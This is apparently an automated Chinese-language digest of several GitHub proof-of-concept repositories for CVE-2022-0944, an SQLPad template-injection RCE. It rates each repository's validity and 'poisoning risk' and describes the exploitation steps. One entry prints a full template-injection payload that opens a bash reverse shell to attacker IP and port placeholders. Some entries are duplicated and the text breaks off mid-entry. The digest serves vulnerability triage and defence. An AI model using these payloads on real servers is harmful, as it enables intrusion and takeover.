**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-0944是SQLPad版本低于6.10.1中存在的一个模板注入漏洞。该漏洞位于connection test endpoint。攻击者可以利用该漏洞在服务器上执行任意代码。根据漏洞描述和提供的POC代码，利用方式如下：

1.  **漏洞原理：** SQLPad在测试数据库连接时，没有充分过滤用户提供的数据库配置信息，导致攻击者可以在数据库配置（例如数据库名称）中使用模板引擎的语法。
2.  **攻击步骤：**
    *   攻击者需要具有高权限才能访问connection test endpoint。
    *   攻击者构造包含恶意代码的payload。该payload利用`process.mainModule.require('child_process').exec()`来执行系统命令。POC中使用反向shell作为例子。
    *   攻击者将构造好的payload插入到数据库连接配置的`database`字段中，并发送到`/api/test-connection`接口。
    *   服务器在测试连接时，会解析payload中的模板代码，从而执行攻击者指定的系统命令，实现远程代码执行。
3.  **POC有效性：** 提供的POC代码利用python脚本自动化了上述攻击过程，通过发送精心构造的POST请求，可以触发漏洞并获得反向shell。根据代码逻辑和漏洞描述，该POC代码是有效的。
4.  **投毒风险：** 代码的`README.md`中声明仅用于教育目的，并免责。代码本身主要功能是发送包含恶意payload的HTTP请求，并在本地监听端口接收反向shell。虽然代码主要功能是漏洞利用，但仍然存在一些潜在的投毒风险：
    *   **Netcat依赖：** POC依赖于系统安装`netcat`，如果目标系统没有`netcat`，漏洞利用会失败。但是，如果攻击者修改了脚本，将反向shell的方式修改为使用python或其他目标系统更可能存在的工具，可能会增加攻击成功率。
    *   **隐蔽后门：** 理论上，脚本可以被修改为在受害者机器上安装持久性后门，例如添加计划任务或者修改启动脚本，但当前的脚本未发现此类行为。
    *   **依赖风险：** 脚本依赖于`requests`库。如果攻击者修改了`requirements.txt`文件，添加恶意的依赖包，可能导致用户安装恶意库。
    *   **安全声明免责：**虽然声明了免责条款，但是仍要小心使用，务必在授权的渗透测试场景中使用。
    *   综合评估，由于POC的主要功能是RCE利用，且代码相对简单，隐藏恶意代码的难度较高。因此投毒风险较低，估计在5%左右。

**项目地址:** [Robocopsita/CVE-2022-0944_RCE_POC](https://github.com/Robocopsita/CVE-2022-0944_RCE_POC)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #8

**来源**: [CVE-2022-0944-shhrew_CVE-2022-0944.md](../2022/CVE-2022-0944-shhrew_CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad 模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户访问，目标存在 /api/test-connection 接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 漏洞是 SQLPad 6.10.1 之前版本中存在的一个模板注入漏洞。该漏洞位于 `/api/test-connection` 接口，攻击者可以通过构造恶意的模板注入payload，执行任意代码。根据漏洞库信息，该漏洞的CVSS 3.0评分为9.1，属于严重级别。搜索引擎结果显示，已经存在公开的漏洞利用代码。

**有效性：**

根据提供的漏洞利用代码，该PoC使用 Python 编写，通过向 `/api/test-connection` 发送包含恶意payload的请求来触发漏洞。Payload 使用 `process.mainModule.require('child_process').exec()` 执行系统命令。代码中还包含一个反弹shell的功能，方便攻击者进行利用。该POC代码看起来是有效的，因为漏洞信息和代码逻辑是符合的.

**投毒风险：**

查看了提供的PoC代码，包含`LICENSE`，`README.md` 和 `main.py` 文件，没有发现明显的恶意代码或者后门，只是实现了漏洞的利用。代码功能比较直观，主要是发送恶意请求并监听端口获取反弹shell。因此，投毒风险评估为0%。

**利用方式：**

1.  **身份验证（可选）：** 如果目标SQLPad实例启用了身份验证，攻击者需要提供有效的用户名和密码才能利用该漏洞。PoC代码提供了身份验证功能。
2.  **发送恶意请求：** 攻击者构造一个包含恶意payload的JSON数据，并将其发送到 `/api/test-connection` 接口。Payload中利用了模板注入的特性，执行任意系统命令，启动反弹shell.
3.  **监听反弹Shell：** 攻击者在本地设置一个监听器，等待目标服务器连接，从而获得对目标服务器的控制权。

总而言之，该漏洞的利用方式简单直接，只需要发送一个精心构造的请求即可实现远程代码执行，风险极高。在sqlpad 6.10.1之前的版本应该升级。

**项目地址:** [shhrew/CVE-2022-0944](https://github.com/shhrew/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #9

**来源**: [CVE-2022-0944-toneillcodes_CVE-2022-0944.md](../2022/CVE-2022-0944-toneillcodes_CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** sqlpad

**危害等级:** 高危，可导致完全控制服务器

**影响版本:** < 6.10.1

**利用条件:** 需要目标实例存在/api/test-connection接口, 需要较高权限才能访问该接口

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-0944是SQLPad 6.10.1之前版本中存在的一个模板注入漏洞。攻击者可以通过向`/api/test-connection`端点发送特制的请求，在服务器上执行任意代码，从而完全控制服务器。根据漏洞库信息和搜索结果，该漏洞危害巨大，易于利用。漏洞利用代码中的Python脚本通过构造包含恶意payload的JSON数据，并将其发送到目标服务器的`/api/test-connection`端点，从而触发远程代码执行。Payload使用 `child_process.exec` 函数来执行操作系统命令，并建立反向shell连接到攻击者的机器。 检查漏洞利用代码，没有发现明显的投毒迹象。Payload部分是标准的反向shell，没有其他恶意行为。因此，投毒风险较低。

**利用方式：**
1.  攻击者需要访问SQLPad实例的`/api/test-connection`接口。
2.  攻击者构造一个包含恶意模板注入payload的JSON请求。Payload使用JavaScript代码调用`child_process.exec`函数来执行任意命令。
3.  攻击者将构造的JSON请求发送到`/api/test-connection`端点。
4.  SQLPad服务器处理该请求时，模板引擎会解析恶意payload，导致执行攻击者指定的命令。
5.  攻击者可以在服务器上执行任意代码，例如创建反向shell连接，从而完全控制服务器。

**项目地址:** [toneillcodes/CVE-2022-0944](https://github.com/toneillcodes/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---



---

## POC #3

**来源**: [CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md](../2022/CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行 (RCE)

**影响应用:** SQLPad

**危害等级:** 严重，可能导致完全系统控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户账户

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944 是 SQLPad 中一个严重的漏洞，攻击者可以通过连接测试端点的模板注入来执行远程代码。根据漏洞库信息和搜索引擎结果，这是一个已知的漏洞，并且存在公开的漏洞利用代码。

**有效性：**

提供的漏洞利用代码（`main.py`）针对此漏洞，并包含使用示例。该代码利用模板注入漏洞，允许攻击者在 SQLPad 服务器上执行任意代码。 根据github上的信息，经验证漏洞可以利用成功。

**投毒风险：**

审查提供的文件，`README.md` 和 `SECURITY.md` 文件看起来标准且无恶意内容。`main.py` 是漏洞利用的核心，需要仔细分析。虽然代码本身的功能是利用漏洞，但仍然存在隐藏恶意代码的可能性，如：

*   **数据回传：** 漏洞利用脚本可能在未经授权的情况下将目标服务器的信息发送给攻击者。
*   **后门植入：** 脚本可能在目标系统上安装后门，以便后续访问。
*   **资源消耗：** 脚本可能消耗目标系统资源，导致拒绝服务。
    
尽管存在这些风险，但脚本的主要目的是利用已知的漏洞。由于脚本代码相对较短且直接，隐藏复杂恶意代码的可能性较低。 综合评估，投毒风险约为 10%，主要基于可能存在的隐蔽数据回传或简单的后门植入。

**利用方式：**

1.  **前提条件：**
    *   目标系统运行的是 SQLPad 6.10.1 之前的版本。
    *   攻击者需要拥有 SQLPad 的高权限用户账户（根据CVE描述，PrivilegesRequired为HIGH）。
2.  **漏洞触发：**
    *   攻击者使用 `main.py` 脚本，提供目标 SQLPad 的 URL、监听 IP 地址和端口，以及高权限用户名和密码。
    *   脚本利用模板注入漏洞，在连接测试端点注入恶意代码。
3.  **远程代码执行：**
    *   注入的恶意代码在 SQLPad 服务器上执行，通常会建立一个反向 shell 连接到攻击者的监听器。
4.  **控制系统：**
    *   攻击者通过反向 shell 获取对 SQLPad 服务器的控制权，可以执行任意命令，访问敏感数据，甚至完全控制系统。

**项目地址:** [Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944](https://github.com/Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #4

**来源**: [CVE-2022-0944-FlojBoj_CVE-2022-0944.md](../2022/CVE-2022-0944-FlojBoj_CVE-2022-0944.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 6.10.0

**利用条件:** 需要高权限用户凭证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于SQLPad的connection test接口，由于使用了模板引擎且未对用户输入进行充分的过滤，导致攻击者可以通过构造恶意模板代码，在服务器端执行任意命令。根据提供的POC代码，利用方式如下：

1.  **身份验证：** 如果需要，首先使用提供的用户名和密码登录SQLPad应用，获取Cookie。
2.  **构造恶意JSON数据：**  构造包含恶意模板代码的JSON数据，其中`database`字段包含利用`process.mainModule.require('child_process').exec()`执行命令的payload。Payload形如：`{{ process.mainModule.require('child_process').exec('命令') }}`
3.  **发送POST请求：** 将构造的JSON数据通过POST请求发送到`/api/test-connection`接口。如果需要，在请求头中包含Cookie。
4.  **执行命令：**  服务器端收到请求后，模板引擎解析`database`字段中的恶意代码，从而执行攻击者指定的命令。
5. **有效性:** 根据漏洞信息和POC，此漏洞的POC代码有效，可以实现远程代码执行。
6.  **投毒风险分析：**  查看了`exploit.py`脚本，该脚本的功能是发送带有恶意payload的请求到目标SQLPad实例的`/api/test-connection`接口，从而触发RCE。没有发现任何其他隐藏的恶意代码，例如上传后门、修改文件等。因此，可以认为该POC代码不存在投毒风险，投毒风险概率为0%。

**项目地址:** [FlojBoj/CVE-2022-0944](https://github.com/FlojBoj/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #5

**来源**: [CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** sqlpad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要具有连接测试的权限（高权限用户）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 是 sqlpad 中存在的一个模板注入漏洞，位于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而获得服务器的控制权。

**有效性：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息明确指出存在模板注入导致RCE的漏洞，搜索结果也指向了相关漏洞细节和POC。提供的PHP代码通过向 `/api/test-connection` 发送包含恶意payload的JSON数据，从而触发远程代码执行。

**投毒风险：**

分析提供的`exploit.php`代码，未发现明显的恶意代码或后门。该脚本的功能主要是发送包含模板注入payload的HTTP请求，以触发目标服务器上的RCE。脚本的逻辑清晰，且直接使用了cURL库发送请求，没有发现任何尝试隐藏或执行其他恶意操作的代码。脚本只是一个exploit，不是后门。

**利用方式：**

1.  **漏洞点：** `/api/test-connection` 接口的 `database` 字段存在模板注入。
2.  **攻击步骤：**
    *   攻击者需要先监听一个端口（例如4444）。
    *   攻击者构造包含恶意代码的JSON数据，恶意代码通常是反弹shell的命令。
    *   攻击者将构造好的JSON数据发送到 `/api/test-connection` 接口。
    *   如果目标服务器存在漏洞，且模板引擎执行了攻击者的恶意代码，目标服务器会反弹shell到攻击者的监听端口。
3.  **Payload：**

    ```
    {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"') }}
    ```

    该payload使用Node.js的 `child_process.exec` 函数执行系统命令，`/bin/bash -c` 执行一段bash脚本，该脚本的作用是创建一个反向shell连接到攻击者的IP地址和端口。

**总结：**

CVE-2022-0944 是一个高危漏洞，攻击者可以利用该漏洞远程执行任意代码。需要及时升级 sqlpad 到 6.10.1 或更高版本。

**项目地址:** [LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944](https://github.com/LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #6

**来源**: [CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md](../2022/CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md)

## CVE-2022-0944-sqlpad-TemplateInjection-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** sqlpad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要目标sqlpad实例的网络访问，以及具有创建连接权限的高权限用户。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944是sqlpad中存在的一个模板注入漏洞，存在于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而完全控制服务器。 

**漏洞利用方式：**

1.  **身份验证：** 首先，攻击者需要拥有 sqlpad 实例中具有创建连接权限的用户身份，一般是管理员权限。
2.  **构造Payload：** 攻击者构造包含恶意代码的模板注入Payload。该Payload利用了Node.js的`child_process.exec`函数来执行系统命令。从提供的漏洞利用代码中可以看到，payload的形式为`{{ process.mainModule.require('child_process').exec('COMMAND') }}`，其中COMMAND是要执行的命令。
3.  **发送请求：**  攻击者通过POST请求将包含Payload的JSON数据发送到`/api/connections`端点，创建一个新的数据库连接配置。关键在于`data.database`字段，该字段会被模板引擎解析，导致代码执行。
4.  **触发漏洞：**  创建连接后，攻击者通过GET请求访问`/api/connections/{id}/schema`端点，触发连接测试，从而执行Payload。
5.  **反弹shell (可选)：**  为了方便利用，攻击者通常使用Payload执行反弹shell命令，从而获得对目标服务器的控制权。
6.  **利用代码分析:**
    * `exploit.py`是一个Python脚本，实现了CVE-2022-0944漏洞的自动化利用。
    * 脚本接受目标URL、攻击者IP等参数。
    * 脚本首先创建一个随机字符串，作为连接名称。
    * 脚本构造包含恶意代码的JSON数据，并将其发送到`/api/connections`端点。
    * 脚本通过GET请求访问`/api/connections/{id}/schema`端点，触发漏洞，从而执行Payload。
    * 脚本可以监听指定端口，接收命令执行结果（通过base64编码）。

**投毒风险评估：**

该代码主要实现了漏洞利用功能，但仍存在一定的投毒风险，评估为10%。理由如下：

*   **潜在的恶意命令注入：** 攻击者可以通过`-c`参数指定要执行的命令。如果脚本没有对该参数进行充分的验证和过滤，攻击者可能会注入恶意命令，例如下载和执行额外的恶意程序。
*   **后门植入：** 攻击者可能修改脚本，在成功利用漏洞后，在目标服务器上植入后门，以便长期控制目标系统。
*   **信息收集：** 脚本可以收集目标服务器的信息，例如操作系统版本、已安装的软件等。这些信息可能会被泄露给攻击者，用于进一步的攻击。

因此，在使用该脚本时，需要仔细检查代码，确保没有恶意代码被注入，并采取必要的安全措施，例如限制脚本的执行权限、监控脚本的网络活动等。

**项目地址:** [Philip-Otter/CVE-2022-0944_RCE_Automation](https://github.com/Philip-Otter/CVE-2022-0944_RCE_Automation)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #7

**来源**: [CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md](../2022/CVE-2022-0944-Robocopsita_CVE-2022-0944_RCE_POC.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** SQLPad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户才能利用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-0944是SQLPad版本低于6.10.1中存在的一个模板注入漏洞。该漏洞位于connection test endpoint。攻击者可以利用该漏洞在服务器上执行任意代码。根据漏洞描述和提供的POC代码，利用方式如下：

1.  **漏洞原理：** SQLPad在测试数据库连接时，没有充分过滤用户提供的数据库配置信息，导致攻击者可以在数据库配置（例如数据库名称）中使用模板引擎的语法。
2.  **攻击步骤：**
    *   攻击者需要具有高权限才能访问connection test endpoint。
    *   攻击者构造包含恶意代码的payload。该payload利用`process.mainModule.require('child_process').exec()`来执行系统命令。POC中使用反向shell作为例子。
    *   攻击者将构造好的payload插入到数据库连接配置的`database`字段中，并发送到`/api/test-connection`接口。
    *   服务器在测试连接时，会解析payload中的模板代码，从而执行攻击者指定的系统命令，实现远程代码执行。
3.  **POC有效性：** 提供的POC代码利用python脚本自动化了上述攻击过程，通过发送精心构造的POST请求，可以触发漏洞并获得反向shell。根据代码逻辑和漏洞描述，该POC代码是有效的。
4.  **投毒风险：** 代码的`README.md`中声明仅用于教育目的，并免责。代码本身主要功能是发送包含恶意payload的HTTP请求，并在本地监听端口接收反向shell。虽然代码主要功能是漏洞利用，但仍然存在一些潜在的投毒风险：
    *   **Netcat依赖：** POC依赖于系统安装`netcat`，如果目标系统没有`netcat`，漏洞利用会失败。但是，如果攻击者修改了脚本，将反向shell的方式修改为使用python或其他目标系统更可能存在的工具，可能会增加攻击成功率。
    *   **隐蔽后门：** 理论上，脚本可以被修改为在受害者机器上安装持久性后门，例如添加计划任务或者修改启动脚本，但当前的脚本未发现此类行为。
    *   **依赖风险：** 脚本依赖于`requests`库。如果攻击者修改了`requirements.txt`文件，添加恶意的依赖包，可能导致用户安装恶意库。
    *   **安全声明免责：**虽然声明了免责条款，但是仍要小心使用，务必在授权的渗透测试场景中使用。
    *   综合评估，由于POC的主要功能是RCE利用，且代码相对简单，隐藏恶意代码的难度较高。因此投毒风险较低，估计在5%左右。

**项目地址:** [Robocopsita/CVE-2022-0944_RCE_POC](https://github.com/Robocopsita/CVE-2022-0944_RCE_POC)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #8

**来源**: [CVE-2022-0944-shhrew_CVE-2022-0944.md](../2022/CVE-2022-0944-shhrew_CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad 模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户访问，目标存在 /api/test-connection 接口

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 漏洞是 SQLPad 6.10.1 之前版本中存在的一个模板注入漏洞。该漏洞位于 `/api/test-connection` 接口，攻击者可以通过构造恶意的模板注入payload，执行任意代码。根据漏洞库信息，该漏洞的CVSS 3.0评分为9.1，属于严重级别。搜索引擎结果显示，已经存在公开的漏洞利用代码。

**有效性：**

根据提供的漏洞利用代码，该PoC使用 Python 编写，通过向 `/api/test-connection` 发送包含恶意payload的请求来触发漏洞。Payload 使用 `process.mainModule.require('child_process').exec()` 执行系统命令。代码中还包含一个反弹shell的功能，方便攻击者进行利用。该POC代码看起来是有效的，因为漏洞信息和代码逻辑是符合的.

**投毒风险：**

查看了提供的PoC代码，包含`LICENSE`，`README.md` 和 `main.py` 文件，没有发现明显的恶意代码或者后门，只是实现了漏洞的利用。代码功能比较直观，主要是发送恶意请求并监听端口获取反弹shell。因此，投毒风险评估为0%。

**利用方式：**

1.  **身份验证（可选）：** 如果目标SQLPad实例启用了身份验证，攻击者需要提供有效的用户名和密码才能利用该漏洞。PoC代码提供了身份验证功能。
2.  **发送恶意请求：** 攻击者构造一个包含恶意payload的JSON数据，并将其发送到 `/api/test-connection` 接口。Payload中利用了模板注入的特性，执行任意系统命令，启动反弹shell.
3.  **监听反弹Shell：** 攻击者在本地设置一个监听器，等待目标服务器连接，从而获得对目标服务器的控制权。

总而言之，该漏洞的利用方式简单直接，只需要发送一个精心构造的请求即可实现远程代码执行，风险极高。在sqlpad 6.10.1之前的版本应该升级。

**项目地址:** [shhrew/CVE-2022-0944](https://github.com/shhrew/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #9

**来源**: [CVE-2022-0944-toneillcodes_CVE-2022-0944.md](../2022/CVE-2022-0944-toneillcodes_CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行

**影响应用:** sqlpad

**危害等级:** 高危，可导致完全控制服务器

**影响版本:** < 6.10.1

**利用条件:** 需要目标实例存在/api/test-connection接口, 需要较高权限才能访问该接口

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-0944是SQLPad 6.10.1之前版本中存在的一个模板注入漏洞。攻击者可以通过向`/api/test-connection`端点发送特制的请求，在服务器上执行任意代码，从而完全控制服务器。根据漏洞库信息和搜索结果，该漏洞危害巨大，易于利用。漏洞利用代码中的Python脚本通过构造包含恶意payload的JSON数据，并将其发送到目标服务器的`/api/test-connection`端点，从而触发远程代码执行。Payload使用 `child_process.exec` 函数来执行操作系统命令，并建立反向shell连接到攻击者的机器。 检查漏洞利用代码，没有发现明显的投毒迹象。Payload部分是标准的反向shell，没有其他恶意行为。因此，投毒风险较低。

**利用方式：**
1.  攻击者需要访问SQLPad实例的`/api/test-connection`接口。
2.  攻击者构造一个包含恶意模板注入payload的JSON请求。Payload使用JavaScript代码调用`child_process.exec`函数来执行任意命令。
3.  攻击者将构造的JSON请求发送到`/api/test-connection`端点。
4.  SQLPad服务器处理该请求时，模板引擎会解析恶意payload，导致执行攻击者指定的命令。
5.  攻击者可以在服务器上执行任意代码，例如创建反向shell连接，从而完全控制服务器。

**项目地址:** [toneillcodes/CVE-2022-0944](https://github.com/toneillcodes/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---



---

## POC #3

**来源**: [CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md](../2022/CVE-2022-0944-Artemisxxx37_OverlayFS-PrivEsc-CVE-2022-0944.md)

## CVE-2022-0944 - SQLPad Template Injection RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致远程代码执行 (RCE)

**影响应用:** SQLPad

**危害等级:** 严重，可能导致完全系统控制

**影响版本:** < 6.10.1

**利用条件:** 需要高权限用户账户

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-0944 是 SQLPad 中一个严重的漏洞，攻击者可以通过连接测试端点的模板注入来执行远程代码。根据漏洞库信息和搜索引擎结果，这是一个已知的漏洞，并且存在公开的漏洞利用代码。

**有效性：**

提供的漏洞利用代码（`main.py`）针对此漏洞，并包含使用示例。该代码利用模板注入漏洞，允许攻击者在 SQLPad 服务器上执行任意代码。 根据github上的信息，经验证漏洞可以利用成功。

**投毒风险：**

审查提供的文件，`README.md` 和 `SECURITY.md` 文件看起来标准且无恶意内容。`main.py` 是漏洞利用的核心，需要仔细分析。虽然代码本身的功能是利用漏洞，但仍然存在隐藏恶意代码的可能性，如：

*   **数据回传：** 漏洞利用脚本可能在未经授权的情况下将目标服务器的信息发送给攻击者。
*   **后门植入：** 脚本可能在目标系统上安装后门，以便后续访问。
*   **资源消耗：** 脚本可能消耗目标系统资源，导致拒绝服务。
    
尽管存在这些风险，但脚本的主要目的是利用已知的漏洞。由于脚本代码相对较短且直接，隐藏复杂恶意代码的可能性较低。 综合评估，投毒风险约为 10%，主要基于可能存在的隐蔽数据回传或简单的后门植入。

**利用方式：**

1.  **前提条件：**
    *   目标系统运行的是 SQLPad 6.10.1 之前的版本。
    *   攻击者需要拥有 SQLPad 的高权限用户账户（根据CVE描述，PrivilegesRequired为HIGH）。
2.  **漏洞触发：**
    *   攻击者使用 `main.py` 脚本，提供目标 SQLPad 的 URL、监听 IP 地址和端口，以及高权限用户名和密码。
    *   脚本利用模板注入漏洞，在连接测试端点注入恶意代码。
3.  **远程代码执行：**
    *   注入的恶意代码在 SQLPad 服务器上执行，通常会建立一个反向 shell 连接到攻击者的监听器。
4.  **控制系统：**
    *   攻击者通过反向 shell 获取对 SQLPad 服务器的控制权，可以执行任意命令，访问敏感数据，甚至完全控制系统。

**项目地址:** [Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944](https://github.com/Artemisxxx37/OverlayFS-PrivEsc-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #4

**来源**: [CVE-2022-0944-FlojBoj_CVE-2022-0944.md](../2022/CVE-2022-0944-FlojBoj_CVE-2022-0944.md)

## CVE-2022-0944-SQLPad-模板注入导致RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** SQLPad

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 6.10.0

**利用条件:** 需要高权限用户凭证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于SQLPad的connection test接口，由于使用了模板引擎且未对用户输入进行充分的过滤，导致攻击者可以通过构造恶意模板代码，在服务器端执行任意命令。根据提供的POC代码，利用方式如下：

1.  **身份验证：** 如果需要，首先使用提供的用户名和密码登录SQLPad应用，获取Cookie。
2.  **构造恶意JSON数据：**  构造包含恶意模板代码的JSON数据，其中`database`字段包含利用`process.mainModule.require('child_process').exec()`执行命令的payload。Payload形如：`{{ process.mainModule.require('child_process').exec('命令') }}`
3.  **发送POST请求：** 将构造的JSON数据通过POST请求发送到`/api/test-connection`接口。如果需要，在请求头中包含Cookie。
4.  **执行命令：**  服务器端收到请求后，模板引擎解析`database`字段中的恶意代码，从而执行攻击者指定的命令。
5. **有效性:** 根据漏洞信息和POC，此漏洞的POC代码有效，可以实现远程代码执行。
6.  **投毒风险分析：**  查看了`exploit.py`脚本，该脚本的功能是发送带有恶意payload的请求到目标SQLPad实例的`/api/test-connection`接口，从而触发RCE。没有发现任何其他隐藏的恶意代码，例如上传后门、修改文件等。因此，可以认为该POC代码不存在投毒风险，投毒风险概率为0%。

**项目地址:** [FlojBoj/CVE-2022-0944](https://github.com/FlojBoj/CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #5

**来源**: [CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md](../2022/CVE-2022-0944-LipeOzyy_SQLPad-RCE-Exploit-CVE-2022-0944.md)

## CVE-2022-0944-sqlpad-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入导致RCE

**影响应用:** sqlpad

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 6.10.1

**利用条件:** 需要具有连接测试的权限（高权限用户）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-0944 是 sqlpad 中存在的一个模板注入漏洞，位于连接测试端点。攻击者可以通过构造恶意的模板注入payload，在目标服务器上执行任意代码，从而获得服务器的控制权。

**有效性：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码，该漏洞利用是有效的。漏洞库信息明确指出存在模板注入导致RCE的漏洞，搜索结果也指向了相关漏洞细节和POC。提供的PHP代码通过向 `/api/test-connection` 发送包含恶意payload的JSON数据，从而触发远程代码执行。

**投毒风险：**

分析提供的`exploit.php`代码，未发现明显的恶意代码或后门。该脚本的功能主要是发送包含模板注入payload的HTTP请求，以触发目标服务器上的RCE。脚本的逻辑清晰，且直接使用了cURL库发送请求，没有发现任何尝试隐藏或执行其他恶意操作的代码。脚本只是一个exploit，不是后门。

**利用方式：**

1.  **漏洞点：** `/api/test-connection` 接口的 `database` 字段存在模板注入。
2.  **攻击步骤：**
    *   攻击者需要先监听一个端口（例如4444）。
    *   攻击者构造包含恶意代码的JSON数据，恶意代码通常是反弹shell的命令。
    *   攻击者将构造好的JSON数据发送到 `/api/test-connection` 接口。
    *   如果目标服务器存在漏洞，且模板引擎执行了攻击者的恶意代码，目标服务器会反弹shell到攻击者的监听端口。
3.  **Payload：**

    ```
    {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1"') }}
    ```

    该payload使用Node.js的 `child_process.exec` 函数执行系统命令，`/bin/bash -c` 执行一段bash脚本，该脚本的作用是创建一个反向shell连接到攻击者的IP地址和端口。

**总结：**

CVE-2022-0944 是一个高危漏洞，攻击者可以利用该漏洞远程执行任意代码。需要及时升级 sqlpad 到 6.10.1 或更高版本。

**项目地址:** [LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944](https://github.com/LipeOzyy/SQLPad-RCE-Exploit-CVE-2022-0944)

**漏洞详情:** [CVE-2022-0944](https://nvd.nist.gov/vuln/detail/CVE-2022-0944)

---

## POC #6

**来源**: [CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md](../2022/CVE-2022-0944-Philip-Otter_CVE-2022-0944_RCE_Automation.md)

## CVE-2022-0944-sqlpad-TemplateInjection-RCE

**漏洞编号:** CVE-2022-0944

**漏洞类型:** 模板注入

**影响应用:** sqlpad

